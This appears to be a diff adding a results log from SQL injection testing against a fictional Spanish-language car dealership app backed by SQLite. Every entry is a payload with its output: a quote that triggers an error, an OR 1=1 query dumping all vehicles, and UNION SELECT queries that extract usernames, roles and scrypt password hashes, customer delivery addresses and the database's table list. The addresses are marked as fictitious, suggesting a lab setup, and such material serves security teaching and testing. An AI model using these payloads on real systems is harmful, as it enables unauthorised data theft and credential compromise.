@@ -1,0 +1,35 @@
+### Payload: SUV
+2 | SUV Familiar GT | 2023 | 459000
+
+### Payload: '
+ERROR: Error en la consulta
+Sin resultados
+
+### Payload: zzz' OR 1=1--
+1 | Sedán Compacto LX | 2022 | 289000
+2 | SUV Familiar GT | 2023 | 459000
+3 | Pickup Trabajo 4x4 | 2021 | 520000
+4 | Hatchback Urbano | 2020 | 215000
+5 | Sedán Ejecutivo | 2023 | 610000
+6 | Crossover Sport | 2022 | 398000
+7 | Eléctrico City | 2024 | 575000
+8 | Van Pasajeros | 2021 | 480000
+
+### Payload: zzz' UNION SELECT id, username, role, password_hash FROM users--
+1 | alice | user | scrypt:32768:8:1$zyIYL544pFAU4tzf$b48b8f0727962c9de4ef2a8df8cc0dfba6a4190096e0077c9b69f12f547d0dfa3bed7faa65ca7b5301b0f7336354c9ea6948e7b128a02eb5715bdaac42cd685c
+2 | bob | user | scrypt:32768:8:1$F11MFqoPUtgGI1AQ$025580340e7bd41db7953297d00d36e5a1de1dafdd076e49c65a1b709a75c34a0237ddfc8ce44855f6a5fe591d5849135918d27bec3d50a4910048043be9fb88
+3 | admin | admin | scrypt:32768:8:1$kiL6i8gnORmrVX3q$a44855f185e1d24490372831750ad06f872da3fed99605742fca831117a05665042f492f83373d845f914df2b824d500643d0ea7aefc8197f36b11edf012486a
+
+### Payload: zzz' UNION SELECT id, delivery_address, user_id, total FROM orders--
+1 | Calle Falsa 123, Monterrey (dirección ficticia) | 1 | 289000
+2 | Calle Falsa 123, Monterrey (dirección ficticia) | 1 | 575000
+3 | Avenida Inventada 456, San Pedro (dirección ficticia) | 2 | 520000
+4 | Avenida Inventada 456, San Pedro (dirección ficticia) | 2 | 610000
+
+### Payload: zzz' UNION SELECT 1, name, 2, type FROM sqlite_master WHERE type='table'--
+1 | orders | 2 | table
+1 | reviews | 2 | table
+1 | sqlite_sequence | 2 | table
+1 | users | 2 | table
+1 | vehicles | 2 | table
+
